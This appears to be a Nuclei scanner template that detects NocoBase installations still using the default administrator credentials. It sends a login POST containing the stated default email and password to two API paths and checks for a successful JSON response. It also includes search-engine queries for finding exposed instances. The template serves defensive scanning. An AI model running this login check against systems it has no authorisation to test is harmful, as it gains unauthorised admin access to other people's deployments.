id: nocobase-default-login
info:
  name: NocoBase - Default Login
  author: Fur1na, icarot
  severity: high
  description: |
    NocoBase default login was discovered.
  reference:
    - https://docs.nocobase.com/welcome/getting-started/installation/docker-compose
    - https://github.com/nocobase/nocobase
    - https://www.nocobase.com/
  metadata:
    runzero-match: any(each(service["http.bodies"]), {# matches "'NOCOBASE_'"})
    max-request: 2
    verified: true
    zoomeye-query: app="NocoBase"
  tags: default-login,nocobase,vuln
variables:
  password: admin123
  username: admin@nocobase.com
http:
  - matchers:
      - condition: and
        part: body
        type: word
        words:
          - '"username":'
          - '"email":'
          - systemSettings
      - part: content_type
        type: word
        words:
          - application/json
      - status:
          - 200
        type: status
    matchers-condition: and
    payloads:
      path:
        - /api/auth:signIn
        - /api/v1/auth/user/signin
    raw:
      - |
        POST {{path}} HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"account": "{{username}}", "password": "{{password}}"}
    stop-at-first-match: true
